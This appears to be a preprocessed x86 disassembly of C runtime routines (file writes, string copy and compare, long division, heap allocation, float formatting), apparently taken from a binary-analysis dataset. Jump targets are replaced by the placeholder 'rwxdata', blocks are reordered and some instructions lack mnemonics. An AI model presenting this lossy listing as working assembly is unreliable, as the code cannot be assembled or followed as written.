add edi 0x4
cmp [ rwxdata ] esi
jl rwxdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov ecx [ edi ]
add eax 0x8
add ecx 0x100
jmp rwxdata
or [ esi + 0x4 ] 0x8
jmp rwxdata
test cl 0x8
jne rwxdata
push 0x100
call sub_4068cc
test eax eax
pop ecx
je rwxdata
jmp rwxdata
cmp eax ecx
jae rwxdata
mov eax edi
mov ecx edi
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rwxdata ]
lea eax [ eax + ecx * 8 ]
mov ecx [ ebx ]
mov [ eax ] ecx
mov cl [ ebp ]
mov [ eax + 0x4 ] cl
push eax
call [ GetFileType@IAT ]
test eax eax
je rwxdata
sub_4094e0
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne rwxdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_405e02
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp rwxdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je rwxdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp rwxdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je rwxdata
cmp esi 0xffffffff
je rwxdata
js rwxdata
mov eax 0x0
jmp rwxdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_405dc0
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_405e02
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_405e96
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_4095c0
mov eax [ rwxdata ]
cmp eax 0x1
je rwxdata
push 0xfc
call sub_4095f9
mov eax [ rwxdata ]
pop ecx
test eax eax
je rwxdata
test eax eax
jne rwxdata
push 0xff
call sub_4095f9
pop ecx
call eax
retn
cmp [ rwxdata ] 0x1
jne rwxdata
sub_4095f9
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rwxdata
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rwxdata ]
jne rwxdata
add eax 0x8
inc ecx
cmp eax rwxdata
jb rwxdata
pop esi
leave
retn
mov eax [ rwxdata ]
cmp eax 0x1
je rwxdata
cmp edx [ eax ]
je rwxdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rwxdata ]
push 0x0
push eax
push [ esi ]
call sub_406440
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne rwxdata
cmp edx 0xfc
je rwxdata
cmp [ rwxdata ] 0x1
je rwxdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne rwxdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_406440
inc eax
pop ecx
cmp eax 0x3c
jbe rwxdata
lea eax [ ebp - 0x1a4 ]
push rwxdata
push eax
call sub_407760
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push rwxdata
push eax
call sub_407760
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_407770
lea eax [ ebp - 0xa0 ]
push rwxdata
push eax
call sub_407770
push [ esi + rwxdata ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_407770
push 0x12010
lea eax [ ebp - 0xa0 ]
push rwxdata
push eax
call sub_40ab32
add esp 0x2c
pop edi
jmp rwxdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_406440
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push rwxdata
push edi
call sub_409750
add esp 0x10
sub_409750
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je rwxdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne rwxdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je rwxdata
shr ecx 0x2
jne rwxdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je rwxdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je rwxdata
jmp rwxdata
test edi 0x3
je rwxdata
test esi 0x3
jne rwxdata
mov [ edi ] edx
add edi 0x4
dec ecx
je rwxdata
test dl dl
je rwxdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je rwxdata
mov ebx ecx
shr ecx 0x2
jne rwxdata
mov [ edi ] al
inc edi
dec ecx
je rwxdata
mov ebx ecx
shr ecx 0x2
jne rwxdata
and ebx 0x3
je rwxdata
xor edx edx
mov [ edi ] edx
test dh dh
je rwxdata
dec ebx
jne rwxdata
dec ebx
jne rwxdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne rwxdata
and ebx 0x3
jne rwxdata
and edx 0xff
mov [ edi ] edx
jmp rwxdata
test edx 0xff0000
je rwxdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne rwxdata
add edi 0x4
xor eax eax
dec ecx
je rwxdata
and edx 0xffff
mov [ edi ] edx
jmp rwxdata
test edx 0xff000000
jne rwxdata
mov [ edi ] edx
jmp rwxdata
sub_409850
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
jecxz rwxdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov esi edi
xor eax eax
[ edi ]
neg ecx
add ecx ebx
mov edi esi
mov esi [ ebp + 0xc ]
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
xor ecx ecx
cmp al [ edi - 0x1 ]
ja rwxdata
not ecx
je rwxdata
dec ecx
dec ecx
sub_409890
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
inc edx
bts [ esp ] eax
jmp rwxdata
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae rwxdata
mov al [ edx ]
or al al
je rwxdata
mov al [ esi ]
or al al
je rwxdata
lea eax [ esi - 0x1 ]
sub_4098ca
mov eax [ rwxdata ]
test eax eax
je rwxdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je rwxdata
push 0x1
pop eax
retn
sub_4098e5
push ebp
mov ebp esp
push ecx
cmp [ rwxdata ] 0x0
push ebx
jne rwxdata
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jge rwxdata
mov eax [ ebp + 0x8 ]
cmp eax 0x61
jl rwxdata
mov edx [ rwxdata ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je rwxdata
cmp [ rwxdata ] 0x1
jle rwxdata
pop ebx
leave
retn
cmp eax 0x7a
jg rwxdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
push 0x1
and [ ebp + 0xa ] 0x0
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
push 0x2
jmp rwxdata
mov eax [ rwxdata ]
mov al [ eax + ebx * 2 ]
and eax 0x2
push 0x2
push ebx
call sub_40732d
pop ecx
pop ecx
jmp rwxdata
sub eax 0x20
jmp rwxdata
mov eax ebx
jmp rwxdata
cmp eax 0x1
jne rwxdata
pop eax
lea ecx [ ebp - 0x4 ]
push 0x1
push 0x0
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push [ rwxdata ]
call sub_4070de
add esp 0x20
test eax eax
je rwxdata
test eax eax
jne rwxdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp rwxdata
sub_4099c3
push ebp
mov ebp esp
sub esp 0x18
fld [ rwxdata ]
fstp [ ebp - 0x8 ]
fld [ rwxdata ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x10 ]
fdiv [ ebp - 0x8 ]
fmul [ ebp - 0x8 ]
fsubr [ ebp - 0x10 ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fcomp [ rwxdata ]
fnstsw ax
sahf
jbe rwxdata
xor eax eax
leave
retn
push 0x1
pop eax
leave
retn
sub_409a01
push rwxdata
call [ GetModuleHandleA@IAT ]
test eax eax
je rwxdata
jmp sub_4099c3
push rwxdata
push eax
call [ GetProcAddress@IAT ]
test eax eax
je rwxdata
push 0x0
call eax
retn
sub_409a2a
push esi
mov esi [ esp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_40add3
cmp eax 0x65
pop ecx
je rwxdata
mov cl [ rwxdata ]
mov al [ esi ]
mov [ esi ] cl
inc esi
inc esi
cmp [ rwxdata ] 0x1
jle rwxdata
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne rwxdata
pop esi
retn
movsx eax [ esi ]
mov ecx [ rwxdata ]
mov al [ ecx + eax * 2 ]
and eax 0x4
movsx eax [ esi ]
push 0x4
push eax
call sub_40732d
pop ecx
pop ecx
jmp rwxdata
test eax eax
jne rwxdata
sub_409a84
mov eax [ esp + 0x4 ]
mov dl [ rwxdata ]
mov cl [ eax ]
test cl cl
je rwxdata
mov cl [ eax ]
inc eax
test cl cl
je rwxdata
cmp cl dl
je rwxdata
retn
mov cl [ eax ]
test cl cl
je rwxdata
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne rwxdata
mov ecx eax
cmp cl 0x65
je rwxdata
dec eax
cmp [ eax ] 0x30
je rwxdata
cmp [ eax ] dl
jne rwxdata
cmp cl 0x45
je rwxdata
mov dl [ ecx ]
inc eax
inc ecx
test dl dl
mov [ eax ] dl
jne rwxdata
dec eax
inc eax
jmp rwxdata
sub_409aea
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x10 ]
je rwxdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40b25d
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
mov [ eax ] ecx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
call sub_40b230
mov eax [ ebp + 0xc ]
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn
sub_409b28
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
push ebx
push esi
je rwxdata
mov eax [ ebp + 0x8 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_40b301
mov ebx [ ebp + 0x10 ]
mov esi eax
push esi
mov edx [ ebp + 0xc ]
lea eax [ ebx + 0x1 ]
push eax
xor eax eax
cmp [ esi ] 0x2d
sete al
xor ecx ecx
test ebx ebx
setg cl
add edx eax
add ecx edx
push ecx
call sub_40b28a
add esp 0x14
mov ebx [ ebp + 0x10 ]
mov eax [ rwxdata ]
xor ecx ecx
mov esi eax
test ebx ebx
setg cl
push ecx
xor ecx ecx
cmp [ eax ] 0x2d
sete cl
add ecx [ ebp + 0xc ]
push ecx
call sub_409e40
pop ecx
pop ecx
jmp rwxdata
test ebx ebx
jle rwxdata
mov [ eax ] 0x2d
inc eax
cmp [ esi ] 0x2d
mov eax [ ebp + 0xc ]
jne rwxdata
xor ecx ecx
push rwxdata
cmp [ rwxdata ] cl
sete cl
add ecx eax
add ecx ebx
push ecx
call sub_407760
cmp [ ebp + 0x14 ] 0x0
pop ecx
pop ecx
mov ecx eax
je rwxdata
mov cl [ eax + 0x1 ]
push edi
lea edi [ eax + 0x1 ]
mov [ eax ] cl
mov cl [ rwxdata ]
mov eax edi
pop edi
mov [ eax ] cl
mov eax [ esi + 0xc ]
inc ecx
cmp [ eax ] 0x30
je rwxdata
mov [ ecx ] 0x45
mov eax [ ebp + 0xc ]
pop esi
pop ebx
pop ebp
retn
mov ebx [ esi + 0x4 ]
dec ebx
jns rwxdata
inc ecx
cmp ebx 0x64
jl rwxdata
neg ebx
mov [ ecx ] 0x2d
inc ecx
cmp ebx 0xa
jl rwxdata
mov eax ebx
push 0x64
cdq
pop esi
idiv esi
add [ ecx ] al
mov eax ebx
cdq
idiv esi
mov ebx edx
add [ ecx + 0x1 ] bl
mov eax ebx
push 0xa
cdq
pop esi
idiv esi
add [ ecx ] al
mov eax ebx
cdq
idiv esi
mov ebx edx
sub_409c2c
cmp [ rwxdata ] 0x0
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
je rwxdata
mov eax [ esp + 0x14 ]
push ecx
push ecx
fld [ eax ]
fstp [ esp ]
call sub_40b301
mov ebx [ esp + 0x24 ]
mov esi eax
push esi
mov eax [ esi + 0x4 ]
add eax ebx
push eax
xor eax eax
cmp [ esi ] 0x2d
sete al
add eax ebp
push eax
call sub_40b28a
add esp 0x14
mov eax [ rwxdata ]
mov ebx [ esp + 0x1c ]
mov esi [ rwxdata ]
cmp eax ebx
jne rwxdata
mov eax [ esi + 0x4 ]
test eax eax
jg rwxdata
mov [ ebp ] 0x2d
lea edi [ ebp + 0x1 ]
cmp [ esi ] 0x2d
mov edi ebp
jne rwxdata
xor ecx ecx
cmp [ esi ] 0x2d
sete cl
add ecx eax
add ecx ebp
mov eax ecx
mov [ eax ] 0x30
and [ eax + 0x1 ] 0x0
jmp rwxdata
add edi eax
push 0x1
push edi
call sub_409e40
pop ecx
mov [ edi ] 0x30
pop ecx
inc edi
jmp rwxdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
push 0x1
push edi
call sub_409e40
mov al [ rwxdata ]
pop ecx
mov [ edi ] al
mov esi [ esi + 0x4 ]
inc edi
pop ecx
test esi esi
jge rwxdata
test ebx ebx
jle rwxdata
cmp [ rwxdata ] 0x0
je rwxdata
neg esi
cmp ebx esi
jl rwxdata
neg esi
jmp rwxdata
push ebx
push edi
call sub_409e40
push ebx
push 0x30
push edi
call sub_406f90
add esp 0x14
mov ebx esi
sub_409d0a
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push ecx
push ecx
fld [ edi ]
fstp [ esp ]
call sub_40b301
mov [ rwxdata ] eax
mov ecx [ eax + 0x4 ]
dec ecx
mov ebx [ ebp + 0x10 ]
mov [ rwxdata ] ecx
xor ecx ecx
cmp [ eax ] 0x2d
push eax
push ebx
sete cl
add ecx [ ebp + 0xc ]
mov esi ecx
push esi
call sub_40b28a
mov eax [ rwxdata ]
add esp 0x14
mov ecx [ eax + 0x4 ]
dec ecx
cmp [ rwxdata ] ecx
setl cl
mov [ rwxdata ] cl
mov eax [ eax + 0x4 ]
dec eax
cmp eax 0xfffffffc
mov [ rwxdata ] eax
jl rwxdata
push [ ebp + 0x14 ]
push ebx
push [ ebp + 0xc ]
push edi
call sub_409da5
add esp 0x10
cmp eax ebx
jge rwxdata
test cl cl
je rwxdata
push ebx
push [ ebp + 0xc ]
push edi
call sub_409dcc
add esp 0xc
jmp rwxdata
mov al [ esi ]
inc esi
test al al
jne rwxdata
pop edi
pop esi
pop ebx
pop ebp
retn
and [ esi - 0x2 ] al
sub_409def
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x65
je rwxdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_409b28
cmp [ ebp + 0x10 ] 0x45
je rwxdata
cmp [ ebp + 0x10 ] 0x66
jne rwxdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_409d0a
jmp rwxdata
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_409c2c
add esp 0xc
pop ebp
retn
add esp 0x10
pop ebp
retn
sub_409e40
push edi
mov edi [ esp + 0xc ]
test edi edi
je rwxdata
pop edi
retn
push esi
mov esi [ esp + 0xc ]
push esi
call sub_406440
inc eax
push eax
push esi
add esi edi
push esi
call sub_405f60
add esp 0x10
pop esi
sub_409e70
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb rwxdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae rwxdata
sub_409e9f
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push rwxdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rwxdata ]
xor ebx ebx
cmp eax ebx
jne rwxdata
cmp eax 0x2
jne rwxdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push rwxdata
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je rwxdata
cmp eax 0x1
jne rwxdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne rwxdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push rwxdata
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je rwxdata
mov eax esi
jmp rwxdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne rwxdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp rwxdata
mov eax [ rwxdata ]
push 0x2
pop eax
mov [ rwxdata ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je rwxdata
mov eax [ rwxdata ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_409e70
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_406f90
add esp 0xc
jmp rwxdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je rwxdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je rwxdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp rwxdata
sub_409ff0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
lea eax [ rwxdata ]
cmp [ eax + 0x8 ] 0x0
jne rwxdata
mov eax 0xff
xor ebx ebx
mov edi edi
mov al 0xff
mov edi edi
pop ebx
pop esi
pop edi
leave
retn
mov al [ esi ]
inc esi
mov bl [ edi ]
inc edi
cmp al bl
je rwxdata
movsx eax al
jmp rwxdata
mov al [ esi ]
inc esi
mov ah [ edi ]
inc edi
cmp ah al
je rwxdata
or al al
je rwxdata
push eax
push ebx
call sub_40add3
mov ebx eax
add esp 0x4
call sub_40add3
add esp 0x4
cmp bl al
je rwxdata
or al al
je rwxdata
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
xchg al ah
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
cmp al ah
je rwxdata
sbb eax eax
sbb eax 0xffffffff
sbb al al
sbb al 0xff
sub_40a07c
mov ecx [ esp + 0x4 ]
xor edx edx
mov [ rwxdata ] ecx
mov eax rwxdata
mov eax [ edx * 8 + rwxdata ]
mov [ rwxdata ] eax
retn
add eax 0x8
inc edx
cmp eax rwxdata
jb rwxdata
cmp ecx [ eax ]
je rwxdata
cmp ecx 0x13
jb rwxdata
cmp ecx 0xbc
jb rwxdata
cmp ecx 0x24
ja rwxdata
mov [ rwxdata ] 0x16
cmp ecx 0xca
mov [ rwxdata ] 0x8
jbe rwxdata
mov [ rwxdata ] 0xd
retn
retn
sub_40a0e3
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rwxdata ]
push edi
jae rwxdata
and [ rwxdata ] 0x0
mov [ rwxdata ] 0x9
or eax 0xffffffff
mov eax ecx
mov esi ecx
sar eax 0x5
and esi 0x1f
lea edi [ eax * 4 + rwxdata ]
shl esi 0x3
mov eax [ edi ]
add eax esi
test [ eax + 0x4 ] 0x1
je rwxdata
cmp [ eax ] 0xffffffff
je rwxdata
cmp [ rwxdata ] 0x1
jne rwxdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp rwxdata
xor eax eax
sub ecx eax
je rwxdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je rwxdata
push eax
push 0xfffffff5
jmp rwxdata
dec ecx
jne rwxdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp rwxdata
sub_40a15d
mov eax [ esp + 0x4 ]
cmp eax [ rwxdata ]
jae rwxdata
and [ rwxdata ] 0x0
mov [ rwxdata ] 0x9
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
test [ ecx + eax * 8 + 0x4 ] 0x1
lea eax [ ecx + eax * 8 ]
je rwxdata
mov eax [ eax ]
retn
sub_40a19a
mov eax [ esp + 0x4 ]
cmp eax [ rwxdata ]
jae rwxdata
mov [ rwxdata ] 0x9
or eax 0xffffffff
mov ecx eax
mov edx eax
sar ecx 0x5
and edx 0x1f
mov ecx [ ecx * 4 + rwxdata ]
test [ ecx + edx * 8 + 0x4 ] 0x1
je rwxdata
push eax
call sub_40a15d
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne rwxdata
xor eax eax
call [ GetLastError@IAT ]
jmp rwxdata
retn
mov [ rwxdata ] eax
test eax eax
je rwxdata
sub_40a1f1
push ebp
mov ebp esp
sub esp 0x414
mov ecx [ ebp + 0x8 ]
push ebx
cmp ecx [ rwxdata ]
push esi
push edi
jae rwxdata
and [ rwxdata ] 0x0
mov [ rwxdata ] 0x9
mov eax ecx
mov esi ecx
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rwxdata ]
shl esi 0x3
mov eax [ ebx ]
mov al [ eax + esi + 0x4 ]
test al 0x1
je rwxdata
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne rwxdata
test al 0x20
je rwxdata
xor eax eax
jmp rwxdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je rwxdata
push 0x2
push edi
push ecx
call sub_40b424
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je rwxdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe rwxdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp rwxdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp rwxdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je rwxdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne rwxdata
mov [ rwxdata ] 0x1c
mov [ rwxdata ] edi
jmp rwxdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je rwxdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne rwxdata
sub eax [ ebp - 0x10 ]
jmp rwxdata
cmp [ ebp + 0x8 ] edi
je rwxdata
or eax 0xffffffff
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp rwxdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl rwxdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl rwxdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop eax
cmp [ ebp + 0x8 ] eax
jne rwxdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb rwxdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae rwxdata
push [ ebp + 0x8 ]
call sub_40a07c
pop ecx
jmp rwxdata
mov [ rwxdata ] 0x9
mov [ rwxdata ] eax
jmp rwxdata
sub_40a3a0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne rwxdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp rwxdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne rwxdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb rwxdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja rwxdata
jb rwxdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe rwxdata
sub_40a410
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne rwxdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp rwxdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne rwxdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb rwxdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja rwxdata
jb rwxdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe rwxdata
sub_40a485
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
imul esi [ ebp + 0xc ]
cmp esi 0xffffffe0
push edi
mov [ ebp + 0x8 ] esi
ja rwxdata
xor edi edi
cmp esi 0xffffffe0
ja rwxdata
test esi esi
jne rwxdata
cmp [ rwxdata ] 0x0
je rwxdata
mov eax [ rwxdata ]
cmp eax 0x3
jne rwxdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
mov eax edi
push esi
call sub_4098ca
test eax eax
pop ecx
je rwxdata
cmp eax 0x2
jne rwxdata
mov eax [ ebp + 0x8 ]
cmp eax [ rwxdata ]
ja rwxdata
xor eax eax
jmp rwxdata
jmp rwxdata
push esi
push 0x8
push [ rwxdata ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne rwxdata
cmp esi [ rwxdata ]
ja rwxdata
push eax
call sub_407ea6
mov edi eax
pop ecx
test edi edi
jne rwxdata
pop edi
pop esi
pop ebp
retn
mov eax esi
shr eax 0x4
push eax
call sub_408949
mov edi eax
pop ecx
test edi edi
jne rwxdata
push [ ebp + 0x8 ]
jmp rwxdata
push esi
jmp rwxdata
push 0x0
push edi
call sub_406f90
add esp 0xc
sub_40a536
push esi
push edi
push 0x3
xor edi edi
pop esi
cmp [ rwxdata ] esi
jle rwxdata
mov eax edi
pop edi
pop esi
retn
mov eax [ rwxdata ]
mov eax [ eax + esi * 4 ]
test eax eax
